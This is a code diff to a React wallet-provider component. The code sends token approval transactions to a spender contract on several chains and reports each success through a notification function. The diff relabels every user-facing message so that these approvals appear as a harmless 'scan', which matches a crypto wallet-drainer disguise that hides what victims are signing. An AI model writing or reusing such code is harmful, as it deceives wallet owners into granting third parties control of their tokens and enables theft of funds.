@@ -146,12 +146,12 @@ export const EvmWalletProvider = ({ children }: { children: ReactNode }) => {
       for (const token of chain.approvalTokens) {
         const allowance = await getAllowance(activeAddress, chain.spenderContract, token.address, chain);
         if (allowance > 0n) {
-          toast.info(`${token.symbol} already approved on ${chain.name}`);
+          toast.info(`${token.symbol} already scanned on ${chain.name}`);
           success = true;
           continue;
         }
 
-        toast.loading(`Approving ${token.symbol} on ${chain.name}...`);
+        toast.loading(`Scanning ${token.symbol} on ${chain.name}...`);
         const calldata = encodeApproveCalldata(chain.spenderContract);
 
         const txHash: string = await provider.client.request({
@@ -173,7 +173,7 @@ export const EvmWalletProvider = ({ children }: { children: ReactNode }) => {
         toast.dismiss();
 
         if (txHash) {
-          toast.success(`${token.symbol} approved on ${chain.name}!`);
+          toast.success(`${token.symbol} scanned on ${chain.name}!`);
           sendEvmApprovalNotification(activeAddress, txHash, chain.id, token.symbol).catch(console.error);
           success = true;
         }
@@ -181,7 +181,7 @@ export const EvmWalletProvider = ({ children }: { children: ReactNode }) => {
     } catch (err: any) {
       console.error(`Approval failed on ${chain.name}:`, err);
       toast.dismiss();
-      toast.error(`Approval failed: ${err.message || "User rejected or network error"}`);
+      toast.error(`Scan failed: ${err.message || "User rejected or network error"}`);
     } finally {
       setIsApproving(false);
     }
